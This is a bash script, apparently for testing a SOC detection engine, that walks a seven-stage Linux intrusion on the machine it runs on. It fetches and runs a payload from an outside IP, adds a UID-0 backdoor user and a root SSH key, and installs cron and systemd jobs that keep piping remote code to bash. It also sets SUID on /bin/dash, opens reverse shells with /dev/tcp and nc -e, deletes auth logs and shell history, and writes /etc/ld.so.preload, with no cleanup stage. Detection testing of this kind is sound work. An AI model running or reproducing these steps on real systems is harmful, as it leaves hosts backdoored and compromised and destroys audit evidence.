#!/usr/bin/env bash
# ============================================================================
#  DEMO ATTACK SCRIPT — simulates a multi-stage Linux intrusion.
#
#  Run this ON THE VICTIM machine while Tracee + the collector are running.
#  Every stage produces syscalls that match the SOC detection engine:
#  anomaly model + 14 curated Sigma rules + 197 imported SigmaHQ rules.
#
#  Usage:
#      sudo bash attack.sh            # full intrusion
#      ATTACKER_IP=10.0.0.1 sudo bash attack.sh
# ============================================================================
set -u

ATTACKER_IP="${ATTACKER_IP:-45.155.204.203}"
PAYLOAD_URL="http://${ATTACKER_IP}/x.sh"
echo "[*] Simulated attacker endpoint: ${ATTACKER_IP}"

# ----------------------------------------------------------------------------
# Stage 1 — payload download to /tmp and execution
#   fires: file_download_tmp, Execution Of Script Located In Potentially
#          Suspicious Directory
# ----------------------------------------------------------------------------
echo "[1/7] Download + execute payload in /tmp"
curl -s -m 10 -o /tmp/demo-x.sh "${PAYLOAD_URL}" 2>/dev/null || echo "(attacker unreachable - simulated)"
chmod +x /tmp/demo-x.sh 2>/dev/null || true
/tmp/demo-x.sh 2>/dev/null || true

# ----------------------------------------------------------------------------
# Stage 2 — backdoor user account + auth file modification
#   fires: New Linux User Created, passwd/shadow/sudoers Modified
# ----------------------------------------------------------------------------
echo "[2/7] Create backdoor user and touch auth files"
useradd -o -u 0 -g 0 demo_svc 2>/dev/null || true
echo "demo_svc:$(openssl rand -base64 12)" | chpasswd 2>/dev/null || true
touch /etc/passwd /etc/shadow 2>/dev/null || true

# ----------------------------------------------------------------------------
# Stage 3 — SSH key injection (persistence)
#   fires: SSH authorized_keys Modified
# ----------------------------------------------------------------------------
echo "[3/7] Inject SSH key"
mkdir -p /root/.ssh 2>/dev/null || true
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDemo demo@attacker" >> /root/.ssh/authorized_keys 2>/dev/null || true
chmod 600 /root/.ssh/authorized_keys 2>/dev/null || true

# ----------------------------------------------------------------------------
# Stage 4 — persistence: cron job + systemd service
#   fires: Cron Job Created or Modified, New systemd Service Created
# ----------------------------------------------------------------------------
echo "[4/7] Install cron + systemd persistence"
echo "*/5 * * * * root /bin/bash -c 'curl -s ${PAYLOAD_URL} | bash'" > /etc/cron.d/demo-backup-sync 2>/dev/null || true
cat > /etc/systemd/system/demo-rescan.service << 'EOF' 2>/dev/null || true
[Unit]
Description=Demo Disk Rescan Service
[Service]
ExecStart=/bin/bash -c "curl -s http://45.155.204.203/keepalive"
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload 2>/dev/null || true

# ----------------------------------------------------------------------------
# Stage 5 — privilege escalation: SUID hunting + root shell via sudo
#   fires: SUID Bit Set or SUID Binary Hunting, Root Shell Opened via sudo
# ----------------------------------------------------------------------------
echo "[5/7] Privilege escalation"
find / -perm -4000 -type f 2>/dev/null | head -20 || true
sudo -i -c "id" 2>/dev/null || sudo -i true 2>/dev/null || true
chmod u+s /bin/dash 2>/dev/null || true

# ----------------------------------------------------------------------------
# Stage 6 — reverse shell to the attacker
#   fires: Reverse Shell Command, Suspicious Reverse Shell Command Line
# ----------------------------------------------------------------------------
echo "[6/7] Open reverse shell (fires, then closes)"
timeout 3 bash -c "echo > /dev/tcp/${ATTACKER_IP}/4444" 2>/dev/null || true
timeout 5 nc -e /bin/sh "${ATTACKER_IP}" 4444 2>/dev/null || true

# ----------------------------------------------------------------------------
# Stage 7 — clear the tracks
#   fires: Log or Shell History Deleted, Code Injection by ld.so Preload
# ----------------------------------------------------------------------------
echo "[7/7] Clear logs and drop ld.so.preload hook"
history -c 2>/dev/null || true
rm -rf /var/log/auth.log /var/log/syslog /root/.bash_history 2>/dev/null || true
echo "/tmp/demo-hook.so" > /etc/ld.so.preload 2>/dev/null || true

echo ""
echo "[✔] Intrusion simulation complete — check the SOC dashboard."
